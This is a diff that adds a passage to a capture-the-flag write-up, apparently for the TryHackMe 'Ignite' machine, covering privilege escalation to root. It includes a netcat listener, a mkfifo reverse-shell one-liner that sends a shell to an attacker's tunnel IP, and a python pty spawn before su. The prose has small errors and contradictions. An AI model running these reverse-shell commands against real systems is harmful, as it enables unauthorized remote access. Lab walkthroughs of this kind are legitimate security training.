@@ -45,3 +45,47 @@ As it is asked what is user.txt
 
 The answer is contained in a file named /home/www-data/flag.txt
 
+Next we're going to do privilage escalation to get the root flag.
+
+This particular paragraph tells something is stored inside the database.php. Let’s check it out.
+
+
+![fig](https://deskel.github.io/assets/images/THM/2020-08-07-ignite-ctf/13.png)
+
+After checking it out i got this
+
+![img](https://deskel.github.io/assets/images/THM/2020-08-07-ignite-ctf/14.png)
+
+
+![igm](https://deskel.github.io/assets/images/THM/2020-08-07-ignite-ctf/15.png)
+
+
+The figure above shows the reverse shell command using Netcat. Before running the command, make sure you have your listener on another terminal. Use the following command.
+
+
+```bash
+nc -lvnp 4444
+```
+
+After that, copy this command in the python script remote shell.
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Tunnel IP> 4444 >/tmp/f
+
+
+Make sure you use your tunnel IP. After that, your Netcat will prompt a reverse shell of the server.
+
+![reverse success](https://deskel.github.io/assets/images/THM/2020-08-07-ignite-ctf/16.png)
+
+Alright, we got the reverse shell. Time to make ourselves a superuser using su command.
+
+![su problem](https://deskel.github.io/assets/images/THM/2020-08-07-ignite-ctf/17.png)
+
+Wait a sec, you can’t run su command on the shell !! This is because /bin/sh of the server is turned off or disabled. We need to spawn a shell using the python.
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+You are now allowed to enter the su command the password to root the machine.
+
+
+![img](https://deskel.github.io/assets/images/THM/2020-08-07-ignite-ctf/18.png)
+
+Now are as root and we can not enter get the root flag at the location /root/root.txt
